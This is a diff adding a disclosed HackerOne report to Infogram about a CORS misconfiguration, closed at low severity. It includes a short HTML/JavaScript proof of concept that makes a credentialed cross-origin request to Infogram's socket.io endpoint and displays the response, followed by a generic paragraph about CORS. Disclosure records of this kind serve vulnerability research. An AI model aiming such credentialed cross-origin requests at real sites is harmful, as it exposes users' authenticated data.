@@ -1,0 +1,24 @@
+ReportLink:https://hackerone.com/reports/372452
+WeaknessName:Improper Access Control - Generic
+Reporter:https://hackerone.com/0-x-1
+ReportedTo:Infogram(infogram)
+BountyAmount:
+Severity:low
+State:Closed
+DateOfDisclosure:08.10.2018 8:20:46
+
+Summary:
+
+Hey Team i don't know if it's valid or not i just want to let you know about this thanks.
+```````````
+Exploit
+``````````````````
+<html>
+<script>
+var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://ws.infogram.com/socket.io/?EIO=3&transport=polling&t=MH7BU79',true); req.withCredentials = true; req.send('{}'); function reqListener() { alert(this.responseText); };
+</script>
+</html>
+
+## Impact
+
+As with superpowers, it’s all about knowing how to use it. Therefore, CORS is not necessarily a bad thing. We’ve seen in many cases that CORS has legitimate use, and this is why it was invented and made a web standard in the first place. However, you need to be aware of the CORS configuration you set up in your server and the side effects this has on security.
